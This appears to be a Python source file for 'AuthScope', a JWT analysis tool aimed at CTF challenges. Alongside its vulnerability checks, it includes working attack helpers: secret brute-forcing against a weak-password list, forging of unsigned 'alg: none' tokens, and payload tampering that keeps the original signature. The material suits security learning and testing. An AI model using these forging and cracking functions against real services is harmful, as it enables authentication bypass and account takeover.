"""
AuthScope - JWT Security Analysis Tool for CTF
Simple, no CLI version
"""

import json
import base64
import hashlib
import time
import jwt
from typing import Dict, List, Optional
from dataclasses import dataclass
import secrets
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import yaml


@dataclass
class JWTResult:
    """Container for JWT analysis results"""
    header: Dict
    payload: Dict
    signature_valid: bool
    algorithm: str
    vulnerabilities: List[str]
    recommendations: List[str]


class AuthScope:
    """
    Simple JWT analysis tool for CTF challenges
    No CLI - just import and use in Python scripts
    """
    
    def __init__(self):
        self.common_secrets = [
            "secret", "password", "admin", "token", "jwt",
            "key", "supersecret", "masterkey", "123456",
            "qwerty", "letmein", "welcome", "changeme"
        ]
    
    def decode_jwt(self, token: str) -> Optional[JWTResult]:
        """Decode JWT without verification"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            # Add padding if needed
            def add_padding(b64_string):
                return b64_string + '=' * (4 - len(b64_string) % 4)
            
            header_b64 = add_padding(parts[0])
            payload_b64 = add_padding(parts[1])
            
            header = json.loads(base64.urlsafe_b64decode(header_b64).decode())
            payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode())
            
            return JWTResult(
                header=header,
                payload=payload,
                signature_valid=False,
                algorithm=header.get('alg', 'HS256'),
                vulnerabilities=[],
                recommendations=[]
            )
        except Exception as e:
            print(f"Error decoding JWT: {e}")
            return None
    
    def analyze(self, token: str) -> JWTResult:
        """Analyze JWT for common vulnerabilities"""
        result = self.decode_jwt(token)
        if not result:
            raise ValueError("Invalid JWT format")
        
        vulns = []
        recs = []
        
        # Check algorithm issues
        alg = result.header.get('alg', '').upper()
        if alg == 'NONE' or alg.endswith('NONE'):
            vulns.append('Algorithm set to "none" - allows signature bypass')
            recs.append('Reject tokens with "none" algorithm')
        
        # Check for weak algorithms
        if alg in ['HS256', 'RS256'] and 'kid' in result.header:
            vulns.append(f'Potential algorithm confusion with {alg}')
            recs.append('Verify algorithm consistency')
        
        # Check expiration
        exp = result.payload.get('exp')
        if exp:
            if exp < time.time():
                vulns.append('Token expired')
                recs.append('Refresh token or re-authenticate')
        
        # Check not before
        nbf = result.payload.get('nbf')
        if nbf and nbf > time.time():
            vulns.append('Token not yet valid')
        
        # Check for sensitive data
        sensitive_keys = ['password', 'secret', 'key', 'credit', 'ssn', 'phone']
        for key in result.payload:
            if any(s in key.lower() for s in sensitive_keys):
                vulns.append(f'Sensitive data found: {key}')
                recs.append('Remove sensitive data from JWT')
        
        # Check for kid injection
        if 'kid' in result.header:
            vulns.append('KID header present - potential path traversal')
            recs.append('Sanitize KID values')
        
        # Check if JWT is too large (potential DoS)
        if len(token) > 8000:
            vulns.append('JWT is very large - potential DoS vector')
            recs.append('Limit JWT size')
        
        result.vulnerabilities = vulns
        result.recommendations = recs
        
        return result
    
    def brute_force(self, token: str, wordlist: List[str] = None) -> Optional[str]:
        """Try common secrets against JWT"""
        if wordlist is None:
            wordlist = self.common_secrets
        
        result = self.decode_jwt(token)
        if not result:
            return None
        
        alg = result.header.get('alg', 'HS256').upper()
        
        for secret in wordlist:
            try:
                if alg.startswith('HS'):
                    jwt.decode(token, secret, algorithms=[alg])
                    return secret
            except:
                continue
        
        return None
    
    def create_none_attack(self, token: str) -> str:
        """Create token with 'none' algorithm"""
        result = self.decode_jwt(token)
        if not result:
            return ""
        
        # Change algorithm to none
        new_header = result.header.copy()
        new_header['alg'] = 'none'
        
        # Re-encode
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(new_header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(result.payload).encode()
        ).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."
    
    def tamper(self, token: str, modifications: Dict) -> str:
        """Create modified JWT"""
        result = self.decode_jwt(token)
        if not result:
            return ""
        
        # Apply modifications
        new_payload = result.payload.copy()
        new_payload.update(modifications)
        
        # Re-encode
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(result.header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(new_payload).encode()
        ).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}.{token.split('.')[2]}"
    
    def encrypt(self, data: str) -> Dict:
        """Encrypt data using AES-GCM (secure AEAD)"""
        key = secrets.token_bytes(32)
        aesgcm = AESGCM(key)
        nonce = secrets.token_bytes(12)
        
        ciphertext = aesgcm.encrypt(nonce, data.encode(), None)
        
        return {
            'ciphertext': base64.b64encode(ciphertext).decode(),
            'nonce': base64.b64encode(nonce).decode(),
            'key': base64.b64encode(key).decode()
        }
    
    def decrypt(self, encrypted_data: Dict) -> str:
        """Decrypt AES-GCM encrypted data"""
        aesgcm = AESGCM(base64.b64decode(encrypted_data['key']))
        ciphertext = base64.b64decode(encrypted_data['ciphertext'])
        nonce = base64.b64decode(encrypted_data['nonce'])
        
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        return plaintext.decode()
    
    def export_nuclei(self, token: str, severity: str = "medium") -> str:
        """Generate Nuclei template for the token"""
        template = {
            "id": f"jwt-test-{hashlib.md5(token.encode()).hexdigest()[:8]}",
            "info": {
                "name": "JWT Security Test",
                "author": "AuthScope",
                "severity": severity,
                "description": "Test JWT token for vulnerabilities"
            },
            "requests": [
                {
                    "method": "GET",
                    "path": ["{{BaseURL}}/api/user"],
                    "headers": {"Authorization": f"Bearer {token}"},
                    "matchers": {
                        "type": "word",
                        "words": ["unauthorized", "invalid", "expired"],
                        "condition": "or"
                    }
                }
            ]
        }
        
        return yaml.dump(template, default_flow_style=False)


# Simple helper function for quick analysis
def quick_analyze(token: str):
    """Quick analysis function for CTF use"""
    scope = AuthScope()
    result = scope.analyze(token)
    
    print("=" * 50)
    print("JWT Quick Analysis")
    print("=" * 50)
    print(f"Algorithm: {result.algorithm}")
    print(f"Header: {json.dumps(result.header, indent=2)}")
    print(f"Payload: {json.dumps(result.payload, indent=2)}")
    
    if result.vulnerabilities:
        print("\n⚠️  Vulnerabilities Found:")
        for vuln in result.vulnerabilities:
            print(f"  - {vuln}")
    else:
        print("\n✅ No obvious vulnerabilities found")
    
    print(f"\nSecret brute force result: {scope.brute_force(token)}")
    print(f"\n'None' attack token: {scope.create_none_attack(token)[:50]}...")
    print("=" * 50)
    
    return result